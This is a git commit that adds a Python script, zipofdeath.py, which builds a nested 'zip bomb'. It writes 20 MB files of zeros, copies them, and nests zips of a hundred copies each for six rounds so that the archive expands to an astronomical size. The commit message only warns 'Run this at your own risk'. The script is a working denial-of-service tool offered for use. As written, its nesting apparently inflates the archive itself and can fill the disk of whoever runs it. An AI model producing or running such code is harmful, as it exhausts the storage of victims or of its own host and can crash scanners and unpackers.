136dfcd239e0159ae959538436fb5fbb09f3c52e
Jen-Shenanigans <jenshen.ng001@gmail.com>
2026-08-31 17:11:21 +0800

    Run this at your own risk

---
+++ zipofdeath.py
@@ -0,0 +1,49 @@
+import os 
+import shutil
+
+##==================
+##Write a file
+##==================
+print("Writing file...")
+
+os.makedirs("bomb")
+
+with open("bomb/death1.txt", "w") as f:
+    for i in range(10000):
+        f.write("0"*2000)
+
+##==================
+##Duplicate
+##==================
+print("Duplicating files...")
+
+for i in range(2, 101):
+    shutil.copy("bomb/death1.txt", f"bomb/death{i}.txt")
+
+##==================
+##Zipping files
+##==================
+print("Zipping files...")
+shutil.make_archive("bomb", "zip", "bomb")
+shutil.rmtree("bomb")
+
+##===================================
+## Duplicating zips
+##===================================
+print("Duplicating zips...")
+
+for i in range(6):
+    print("Round", i+1)
+
+    os.makedirs("bomb")
+    shutil.move("bomb.zip", "bomb")
+
+    for j in range(2, 101):
+        shutil.copy("bomb/bomb.zip", f"bomb/bomb{j}.zip")
+
+    shutil.make_archive("bomb", "zip", "bomb")
+    shutil.rmtree("bomb")
+
+
+print("Done!")
+
